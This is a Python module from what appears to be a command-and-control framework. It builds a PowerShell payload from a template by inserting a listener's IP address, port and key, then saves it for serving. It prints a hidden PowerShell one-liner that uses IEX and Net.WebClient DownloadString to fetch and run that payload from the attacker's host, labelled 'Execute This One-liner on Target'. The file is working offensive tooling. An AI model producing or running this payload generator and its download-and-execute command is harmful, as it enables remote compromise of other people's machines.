from shutil import copyfile

from common import *
from listenershelpers import listeners, isValidListener, checkListenersEmpty

Payloads = {
    "powershell" : "Powershell script."
}

vPayloads = [payload for payload in Payloads]
vArchs    = ["x64", "x32"]
def isValidPayload(name, s):

    if name in vPayloads:
        return True
    else:
        if s == 1:
            error("Invalid payload type.")
            return False
        else:
            return False

def isValidArch(arch, s):

    if arch in vArchs:
        return True
    else:
        if s == 1:
            error("Invalid architecture.")
            return False
        else:
            return False

def viewPayloads():

    success("Available payload types: ")

    print(YELLOW)
    print(" Type                         Description")
    print("------                       -------------")
    
    for i in Payloads:
        print(" {}".format(i) + " " * (29 - len(i)) + "{}".format(Payloads[i]))
    
    print(cRESET)


def powershell(listener, outputname):
    
    outpath = "/tmp/{}".format(outputname)
    ip      = listeners[listener].ipaddress
    port    = listeners[listener].port
    key     = listeners[listener].key

    with open("./templates/powershell.ps1", "rt") as p:
        payload = p.read()

    payload = payload.replace('REPLACE_IP',ip)
    payload = payload.replace('REPLACE_PORT',str(port))
    payload = payload.replace('REPLACE_KEY', key)

    with open(outpath, "wt") as f:
        f.write(payload)
    
    with open("{}{}".format(listeners[listener].filePath, outputname), "wt") as f:
        f.write(payload)

    oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), outputname)

    success("File saved in: {}".format(outpath))
    success("Execute This One-liner on Target: {}".format(oneliner))
    

def generatePayload(args):
    
    if len(args) != 4:
        error("Invalid arguments.")
        return 0
    else:
        
        Type       = args[0]
        arch       = args[1]
        listener   = args[2]
        outputname = args[3]
        
        if isValidPayload(Type, 1) == False:
            return 0
        
        if checkListenersEmpty(1) == True:
            return 0

        if isValidListener(listener, 1) == False:
            return 0
        
        if isValidArch(arch, 1) == False:
            return 0
        
        if Type == "powershell":
            powershell(listener, outputname)